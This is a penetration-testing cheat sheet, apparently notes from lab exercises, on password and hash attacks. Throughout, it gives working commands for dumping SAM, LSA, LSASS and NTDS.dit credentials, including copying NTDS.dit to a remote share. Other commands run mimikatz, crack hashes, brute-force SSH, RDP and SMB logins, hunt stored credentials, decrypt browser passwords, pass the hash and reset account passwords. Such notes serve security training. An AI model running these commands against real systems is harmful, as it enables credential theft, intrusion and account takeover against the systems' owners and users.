# Password & Hash Attacks

## Dump Hashes

#### Impacket-Secrets Dump

```bash
impacket-secretsdump backup@spookysec.local # requires password for user
impacket-secretsdump Administrator@10.11.1.1 -hashes 'NTLM:NTLM'
impacket-secretsdump marvel/fcastle:Password1@192.168.183.137
```

#### SAM / SYSTEM / SECURITY Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\sam C:\sam.save


# Transfer them to our attacking machine and run one of the following
impacket-secretsdump -sam sam -system system -security security LOCAL
impacket-secretsdump -sam sam -system system LOCAL

# Running Hashcat against NT Hashes
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

#### LSA Secrets

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### LSASS

```powershell
# Finding LSASS PID
C:\Windows\system32> tasklist /svc
PS C:\Windows\system32> Get-Process lsass

# Creating lsass.dmp using PowerShell
# With an elevated PowerShell session, we can issue the following command to create the dump file:
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Using Pypykatz to Extract Credentials
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Cracking the NT Hash with Hashcat
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

#### NTDS.dit

```shell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

# Crack the hashes
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

#Perform pass the hash
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

#### Mimikatz/Pypykatz

https://adsecurity.org/?page\_id=1821

```bash
privilege::debug

sekurlsa::logonPasswords
lsadump::sam
lsadump::sam /patch
lsadump::lsa /patch
lsadump::secrets
kerberos::list

mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "lsadump::secrets" "exit"

pypykatz lsa minidump filename.DMP
```

#### Metasploit

```bash
load kiwi

creds_all
lsa_dump_lsa
lsa_dump_secrets
kerberos_list
```

#### MySQL

```bash
#inside mysql 
SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;
SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) FROM users; # 2x encoded

echo 'SOMETHING123==' | base64 -d
```

#### MSSQL

https://blog.xpnsec.com/extracting-master-mdf-hashes/

```bash
git clone https://github.com/xpn/Powershell-PostExploitation.git
```

```
Editing the file, 2 line to correct directory for dlls.

Import-Module .\Get-MDFHashes.ps1

Get-MDFHashes -mdf "C:\Users\Administrator\Desktop\master.mdf"
sa                             0x.......
```

**Cracking**

https://hashcat.net/wiki/doku.php?id=example\_hashes

1731 - MSSQL (2012, 2014) - MATCH!

```
hashcat -m 1731 -a 0 hash.txt rockyou.txt --force
sa - password1
```

## Password Cracking

#### Responder

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

```bash
responder -I <interface name>
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

#### w/ John The Ripper

```shell
john --format=<hash_type> <hash or hash_file>
john --format=sha256 hashes_to_crack.txt
john --format=LM hashes_to_crack.txt
john --format=md5 hashes_to_crack.txt
john --format=krb4 hashes_to_crack.txt
john --format=krb5 hashes_to_crack.txt
john --format=mssql hashes_to_crack.txt
john --format=netlm hashes_to_crack.txt
john --format=netlmv2 hashes_to_crack.txt
john --format=netntlm hashes_to_crack.txt
john --format=netntlmv2 hashes_to_crack.txt
john --format=sha1-gen hashes_to_crack.txt
```

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

Find them using

```shell
locate *2john*
```

**ssh2john**

Encrypted SSH private key found? Crack it with ssh2john

```bash
1) ssh2john id_rsa > crack.txt
2) john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
3) openssl rsa -in id_rsa

Enter pass phrase for id_rsa: PASSWORD_HERE
```

**gpg2john**

Encrypted PGP file found? Crack it with gpg2john

```bash
gpg --import name.asc
gpg2john name.asc > hash
john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash
gpg --decrypt somecredentials.pgp # Enter
```

**zip2john**

Encrypted ZIP file found? Crack it with zip2john

```bash
1) zip2john somezipname.zip > zipname.hash
2) john zipname.hash
3) 7z e somezipname.zip

Enter password (will not be echoed): PASSWORD_HERE
```

**keepass2john**

```bash
keepass2john some_pass_key.kdbx
```

**rar2john**

```bash
rar2john SOME_FILE.rar > crack_this
john --wordlist=/usr/share/wordlists/rockyou.txt crack_this
```

#### TGS

```bash
.\Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt
```

````

### SSH
#### Hydra
```shell
hydra -L user.list -P password.list ssh://10.129.42.197
hydra -C user_pass.list ssh://10.129.42.197
````

#### RDP

```shell
hydra -L user.list -P password.list rdp://10.129.42.197

xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

#### SMB

```shell
hydra -L user.list -P password.list smb://10.129.42.19
msf6 > use auxiliary/scanner/smb/smb_login


crackmapexec smb 10.129.42.197 -u "user" -p "password"
crackmapexec smb --local-auth 10.129.42.197 -u "user" -p "password" 
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

## Credential Hunting

#### Windows

**Lazagne**

We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.

```
start lazagne.exe all
```

**findstr**

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in web.config files on dev machines and IT shares
* unattend.xml
* Passwords in the AD user or computer description fields
* KeePass databases --> pull hash, crack and get loads of access.
* Found on user systems and shares
* Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

#### Linux

**Config Files**

````shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Creds in Config Files
```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
````

**Databases**

```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Notes**

```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Scripts**

```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Cronjobs**

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs

```shell
cat /etc/crontab
```

**SSH Keys**

```shell
# Private Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Public Keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

**History**

```shell
# bash history
tail -n5 /home/*/.bash*

# logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

**Memory and Cache**

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

```shell
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

And of course Lazagne

```shell
sudo python2.7 laZagne.py all
```

**Browsers**

Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the `Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

```shell
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

**Firefox Stored Credentials**

```shell
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

The tool [Firefox Decrypt](https://github.com/unode/firefox\_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

**Decrypting Firefox Credentials**

```shell
lojique@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternatively, `LaZagne` can also return results if the user has used the supported browser.

**Browsers - LaZagne**

```shell
python3 laZagne.py browsers
```

## Pass-The-Hash

#### w/ Local & Domain Accounts

```powershell
crackmapexec smb 192.168.183.0/24 -u "Frank Castle" -H <hash> --local-auth
crackmapexec smb 192.168.183.137 -u "Frank Castle" -p Password1
crackmapexec smb 192.168.183.0/24 -u fcastle -d MARVEL.local -p Password1
evil-winrm -i '10.10.11.129' -u 'Sam.Davies' -p 'Password123'
impacket-psexec domain.local/administrator:MyPasswowrd123@10.10.10.100
impacket-psexec domain.local/administrator@10.10.10.100 -H <hash>
```

#### w/ Machine$ Accounts

* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts
* https://pentestlab.blog/2022/02/01/machine-accounts/

## Generating a Wordlist

We can use a tool called [CeWL](https://github.com/digininja/CeWL) to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (`-d`), the minimum length of the word (`-m`), the storage of the found words in lowercase (`--lowercase`), as well as the file where we want to store the results (`-w`).

#### CeWL

```shell
lojique@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
lojique@htb[/htb]$ wc -l inlane.wordlist

326
```

## Change User's Password

#### SMB

```bash
smbpasswd -U user -r domain.local
impacket-smbpasswd user:oldPassword@domain.local -newpass P@ssw0rd123
```

#### RPCclient

https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html https://room362.com/post/2017/reset-ad-user-password-with-linux/

```bash
setuserinfo2 username 23 'P@ssw0rd123!'
net rpc password [pwd4userUwant2change] -U [userWithPwdChangePerms] -S 192.168.80.10
```

## Resources

* [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* https://hashcat.net/wiki/doku.php?id=example\_hashes
* https://hashes.com/en/decrypt/hash
* https://crackstation.net/
* https://md5hashing.net/hash
